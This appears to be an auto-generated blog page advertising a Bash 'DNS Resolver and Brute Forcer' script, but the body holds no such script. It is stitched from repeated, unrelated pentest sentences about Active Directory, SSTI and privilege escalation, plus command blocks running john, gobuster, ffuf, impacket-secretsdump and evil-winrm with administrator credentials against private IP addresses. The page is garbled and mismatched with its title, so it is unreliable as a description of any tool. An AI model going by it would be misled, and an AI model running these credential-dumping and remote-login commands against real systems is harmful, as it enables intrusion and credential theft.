---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "go, automation, tool, powershell, bash"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-699.html"
URL_IMAGES: ""
Date: "2024-02-12"
Tags: "Go, Automation, Tool, PowerShell, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-699"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-699.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `hashcat`
- `kerbrute`
- `mimikatz`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.76.199.15/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.138.241
evil-winrm -i 10.17.134.84 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.92.209/FUZZ
gobuster dir -u http://10.129.244.27/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.52.164.205 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```bash
evil-winrm -i 10.49.83.53 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.171.80/FUZZ
```

## Output

### Example Output

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 29.16s
```
